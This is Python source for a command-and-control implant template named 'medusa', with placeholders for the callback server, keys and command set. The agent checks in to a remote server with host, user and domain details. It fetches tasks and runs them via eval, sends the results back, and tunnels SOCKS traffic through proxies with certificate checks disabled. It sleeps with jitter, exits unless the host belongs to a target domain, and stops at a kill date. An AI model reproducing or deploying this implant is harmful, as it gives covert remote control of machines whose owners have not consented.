import os, random, sys, json, socket, base64, time, platform, ssl, getpass
import urllib.request
from datetime import datetime
import threading, queue

CHUNK_SIZE = 51200

CRYPTO_HERE

    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]
    def isJoinedToTheProvidedDomain(self):
        target_domain = self.agent_config["DomainCheck"]
        try:
            # For Windows systems, use NetGetJoinInformation for robust domain detection
            if os.name == 'nt':
                import ctypes
                from ctypes import wintypes, POINTER, byref
                
                # NetGetJoinInformation constants
                NetSetupUnknownStatus = 0
                NetSetupUnjoined = 1
                NetSetupWorkgroupName = 2
                NetSetupDomainName = 3
                
                # Load netapi32.dll
                netapi32 = ctypes.WinDLL('netapi32.dll')
                
                # Define NetGetJoinInformation function
                NetGetJoinInformation = netapi32.NetGetJoinInformation
                NetGetJoinInformation.argtypes = [
                    wintypes.LPCWSTR,  # lpServer
                    POINTER(wintypes.LPWSTR),  # lpNameBuffer
                    POINTER(wintypes.DWORD)   # BufferType
                ]
                NetGetJoinInformation.restype = wintypes.DWORD
                
                # Define NetApiBufferFree
                NetApiBufferFree = netapi32.NetApiBufferFree
                NetApiBufferFree.argtypes = [wintypes.LPVOID]
                NetApiBufferFree.restype = wintypes.DWORD
                
                # Call NetGetJoinInformation
                name_buffer = wintypes.LPWSTR()
                buffer_type = wintypes.DWORD()
                
                result = NetGetJoinInformation(
                    None,  # Local computer
                    byref(name_buffer),
                    byref(buffer_type)
                )
                
                if result == 0:  # NERR_Success
                    try:
                        # Check if system is domain-joined
                        if buffer_type.value == NetSetupDomainName:
                            # Get domain name
                            domain_name = ctypes.wstring_at(name_buffer).upper()
                            target_domain_upper = target_domain.upper()
                            
                            # Free the buffer
                            NetApiBufferFree(name_buffer)
                            
                            # Compare domain names
                            return domain_name == target_domain_upper
                        else:
                            # System is not domain-joined (workgroup or unknown)
                            NetApiBufferFree(name_buffer)
                            return False
                    except:
                        # Free buffer on error
                        try:
                            NetApiBufferFree(name_buffer)
                        except:
                            pass
                        return False
                else:
                    # NetGetJoinInformation failed, fallback to environment variables
                    pass
            
            # Linux/macOS domain detection methods
            if os.name == 'posix':
                import socket
                target_domain_upper = target_domain.upper()
                
                # Method 1: Check /etc/resolv.conf for domain/search directives
                try:
                    with open('/etc/resolv.conf', 'r') as f:
                        resolv_content = f.read().upper()
                        for line in resolv_content.split('\n'):
                            line = line.strip()
                            if line.startswith('DOMAIN ') or line.startswith('SEARCH '):
                                domains = line.split()[1:]
                                for domain in domains:
                                    if domain == target_domain_upper:
                                        return True
                except:
                    pass
                
                # Method 2: Use socket.getfqdn() to get FQDN
                try:
                    fqdn = socket.getfqdn().upper()
                    if '.' in fqdn:
                        domain_part = '.'.join(fqdn.split('.')[1:])
                        if domain_part == target_domain_upper:
                            return True
                except:
                    pass
                
                # Method 3: Check /etc/hostname and /etc/hosts for domain info
                try:
                    with open('/etc/hostname', 'r') as f:
                        hostname = f.read().strip().upper()
                        if '.' in hostname:
                            domain_part = '.'.join(hostname.split('.')[1:])
                            if domain_part == target_domain_upper:
                                return True
                except:
                    pass
                
                # Method 4: Parse /etc/krb5.conf for Kerberos realm (domain-joined systems)
                try:
                    with open('/etc/krb5.conf', 'r') as f:
                        krb_content = f.read().upper()
                        for line in krb_content.split('\n'):
                            line = line.strip()
                            if 'DEFAULT_REALM' in line and '=' in line:
                                realm = line.split('=')[1].strip()
                                if realm == target_domain_upper:
                                    return True
                except:
                    pass
                
                # Method 5: Check /etc/sssd/sssd.conf for domain configuration
                try:
                    with open('/etc/sssd/sssd.conf', 'r') as f:
                        sssd_content = f.read().upper()
                        for line in sssd_content.split('\n'):
                            line = line.strip()
                            if line.startswith('[DOMAIN/') and line.endswith(']'):
                                domain = line[8:-1]  # Remove [domain/ and ]
                                if domain == target_domain_upper:
                                    return True
                except:
                    pass
                
                # Method 6: Check systemd-resolved configuration files
                try:
                    # Check systemd-resolved main config
                    with open('/etc/systemd/resolved.conf', 'r') as f:
                        resolved_content = f.read().upper()
                        for line in resolved_content.split('\n'):
                            line = line.strip()
                            if line.startswith('DOMAINS='):
                                domains = line.split('=')[1].split()
                                for domain in domains:
                                    if domain == target_domain_upper:
                                        return True
                except:
                    pass
                
                # Method 7: Check /etc/dhcp/dhclient.conf for domain settings
                try:
                    with open('/etc/dhcp/dhclient.conf', 'r') as f:
                        dhcp_content = f.read().upper()
                        for line in dhcp_content.split('\n'):
                            line = line.strip()
                            if 'DOMAIN-NAME' in line and '"' in line:
                                # Extract domain from quoted string
                                parts = line.split('"')
                                if len(parts) >= 2:
                                    domain = parts[1].strip()
                                    if domain == target_domain_upper:
                                        return True
                except:
                    pass
                
                # Method 8: macOS specific - check system configuration files
                if platform.system().upper() == 'DARWIN':
                    try:
                        # Check /etc/resolv.conf alternatives on macOS
                        with open('/var/run/resolv.conf', 'r') as f:
                            resolv_content = f.read().upper()
                            for line in resolv_content.split('\n'):
                                line = line.strip()
                                if line.startswith('DOMAIN ') or line.startswith('SEARCH '):
                                    domains = line.split()[1:]
                                    for domain in domains:
                                        if domain == target_domain_upper:
                                            return True
                    except:
                        pass
                    
                    # Check macOS Directory Services configuration
                    try:
                        import plistlib
                        with open('/Library/Preferences/OpenDirectory/Configurations/Active Directory.plist', 'rb') as f:
                            plist_data = plistlib.load(f)
                            if 'domain name' in plist_data:
                                ad_domain = plist_data['domain name'].upper()
                                if ad_domain == target_domain_upper:
                                    return True
                    except:
                        pass
                
                # Method 9: Check network interface configuration files
                try:
                    import glob
                    # Check various network config locations
                    config_paths = [
                        '/etc/sysconfig/network-scripts/ifcfg-*',
                        '/etc/network/interfaces',
                        '/etc/netplan/*.yaml',
                        '/etc/netplan/*.yml'
                    ]
                    
                    for pattern in config_paths:
                        for config_file in glob.glob(pattern):
                            try:
                                with open(config_file, 'r') as f:
                                    content = f.read().upper()
                                    for line in content.split('\n'):
                                        line = line.strip()
                                        if any(keyword in line for keyword in ['DOMAIN', 'SEARCH_DOMAIN', 'DNS_DOMAIN']):
                                            if '=' in line:
                                                domain = line.split('=')[1].strip().strip('"\'')
                                                if domain == target_domain_upper:
                                                    return True
                            except:
                                continue
                except:
                    pass
                
                return False
            
            # Fallback method using environment variables (Windows)
            current_domain = os.environ.get('USERDOMAIN', '').upper()
            target_domain_upper = target_domain.upper()
            
            # Check if current domain matches target domain
            if current_domain == target_domain_upper:
                return True
                
            # Additional check using USERDNSDOMAIN for FQDN
            dns_domain = os.environ.get('USERDNSDOMAIN', '').upper()
            if dns_domain == target_domain_upper:
                return True
                
            return False
        except Exception:
            # If any error occurs, assume not joined to target domain
            return False
      
    def formatMessage(self, data, urlsafe=False):
        output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe: 
            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        return output

    def formatResponse(self, data):
        return json.loads(data.replace(self.agent_config["UUID"],""))

    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))

    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                        if resp["task_id"] == t["task_id"] \
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass

    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    def processTaskings(self):
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    def checkIn(self):
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain:": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
        if("status" in decoded_data):
            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False


    def makeRequest(self, data, method='GET'):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header] = self.agent_config["Headers"][header]
        if method == 'GET':
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
        
        # Check if proxy is configured and get proxy URLs list
        proxy_urls = []
        if "ProxyHosts" in self.agent_config and self.agent_config["ProxyHosts"]:
            proxy_urls = self.agent_config["ProxyHosts"]
        elif self.agent_config.get("ProxyHost"):
            # Fallback to single ProxyHost for compatibility
            if "ProxyPorts" in self.agent_config and self.agent_config["ProxyPorts"]:
                proxy_ports = self.agent_config["ProxyPorts"]
            elif "ProxyPort" in self.agent_config and self.agent_config["ProxyPort"]:
                proxy_ports = [self.agent_config["ProxyPort"]]
            else:
                proxy_ports = []
            
            # Convert old format to new format
            for port in proxy_ports:
                tls = "https" if self.agent_config["ProxyHost"].startswith("https") else "http"
                proxy_host = self.agent_config["ProxyHost"].replace("https://", "").replace("http://", "")
                proxy_urls.append(f"{tls}://{proxy_host}:{port}")
        
        # Prioritize connection methods based on last successful method
        prioritized_methods = []
        
        if self.last_successful_method:
            if self.last_successful_method == "direct":
                # Direct connection worked last time, try it first
                prioritized_methods.append("direct")
                # Then try proxy URLs
                if proxy_urls:
                    prioritized_methods.extend([("proxy", url) for url in proxy_urls])
            elif isinstance(self.last_successful_method, tuple) and self.last_successful_method[0] == "proxy":
                # A specific proxy URL worked last time, try it first
                last_successful_url = self.last_successful_method[1]
                if last_successful_url in proxy_urls:
                    prioritized_methods.append(("proxy", last_successful_url))
                    # Then try other proxy URLs
                    other_urls = [url for url in proxy_urls if url != last_successful_url]
                    prioritized_methods.extend([("proxy", url) for url in other_urls])
                else:
                    # Last successful URL is no longer in config, try all proxy URLs
                    prioritized_methods.extend([("proxy", url) for url in proxy_urls])
                # Finally try direct connection
                prioritized_methods.append("direct")
        else:
            # No previous success info, use default order: proxy URLs first, then direct
            if proxy_urls:
                prioritized_methods.extend([("proxy", url) for url in proxy_urls])
            prioritized_methods.append("direct")
        
        # Helper function to record success
        def record_success(method):
            self.last_successful_method = method
            if method not in self.connection_success_history:
                self.connection_success_history[method] = 0
            self.connection_success_history[method] += 1
        
        # Try connection methods in prioritized order
        for conn_method in prioritized_methods:
            if conn_method == "direct":
                # Try direct connection
                try:
                    # Reset to no proxy for direct connection
                    urllib.request.install_opener(urllib.request.build_opener())
                    
                    # Create a new request object for direct connection with correct target URL
                    if method == 'GET':
                        direct_url = self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode()
                        direct_req = urllib.request.Request(direct_url, None, hdrs)
                    else:
                        direct_url = self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"]
                        direct_req = urllib.request.Request(direct_url, data, hdrs)
                    
                    with urllib.request.urlopen(direct_req) as response:
                        out = base64.b64decode(response.read())
                        response.close()
                        record_success("direct")
                        return out
                except Exception as e: 
                    continue
            
            elif isinstance(conn_method, tuple) and conn_method[0] == "proxy":
                # Try specific proxy URL
                proxy_url = conn_method[1]
                
                if not proxy_urls:  # Skip if no proxy configured
                    continue
                
                # Parse the proxy URL to extract components
                try:
                    from urllib.parse import urlparse
                    parsed_proxy = urlparse(proxy_url)
                    proxy_host = parsed_proxy.hostname
                    proxy_port = parsed_proxy.port or (443 if parsed_proxy.scheme == "https" else 80)
                    tls = parsed_proxy.scheme
                except Exception as e:
                    continue
                
                # Check if proxy host is resolvable (cache result per host)
                proxy_host_key = f"_proxy_host_resolved_{proxy_host}"
                if not hasattr(self, proxy_host_key):
                    try:
                        resolved_ip = socket.gethostbyname(proxy_host)
                        setattr(self, proxy_host_key, True)
                    except (socket.gaierror, Exception) as e:
                        setattr(self, proxy_host_key, False)
                
                if not getattr(self, proxy_host_key):
                    continue
                
                try:
                    # Create SSL context that doesn't verify certificates for proxy connections
                    import ssl
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                    
                    # Create HTTPS handler with custom SSL context
                    https_handler = urllib.request.HTTPSHandler(context=ssl_context)
                    http_handler = urllib.request.HTTPHandler()
                    
                    if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                        auth_proxy_url = '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], proxy_host, proxy_port)
                        proxy = urllib.request.ProxyHandler({
                            "http": auth_proxy_url,
                            "https": auth_proxy_url
                        })
                        auth = urllib.request.HTTPBasicAuthHandler()
                        opener = urllib.request.build_opener(proxy, auth, https_handler, http_handler)
                    else:
                        proxy = urllib.request.ProxyHandler({
                            "http": proxy_url,
                            "https": proxy_url
                        })
                        opener = urllib.request.build_opener(proxy, https_handler, http_handler)
                    urllib.request.install_opener(opener)
                    
                    # Use the opener directly to ensure proxy is used
                    with opener.open(req) as response:
                        out = base64.b64decode(response.read())
                        response.close()
                        record_success(("proxy", proxy_url))
                        return out
                except Exception as e:
                    continue
        
        # If we get here, all methods failed
        return ""

    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

#COMMANDS_HERE

    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        # Track the last successful connection method for prioritization
        self.last_successful_method = None  # Will be "direct" or ("proxy", proxy_url)
        self.connection_success_history = {}  # Track success counts for each method
        self.agent_config = {
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "Headers": headers,
            "Sleep": callback_interval,
            "Jitter": callback_jitter,
            "KillDate": "killdate",
            "enc_key": AESPSK,
            "ExchChk": "encrypted_exchange_check",
            "GetURI": "/get_uri",
            "GetParam": "query_path_name",
            "ProxyHosts": PROXYHOSTS_HERE,
            "ProxyUser": "proxy_user",
            "ProxyPass": "proxy_pass",
            "ProxyPort": "proxy_port",
            "DomainCheck": "DOMAIN_CHECK_HERE",
        }
        if self.agent_config["DomainCheck"] != "":
            if not self.isJoinedToTheProvidedDomain():
                os._exit(0)
        while(True):
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while(True):
                    if self.passedKilldate():
                        self.exit()
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()                   

if __name__ == "__main__":
    medusa = medusa()
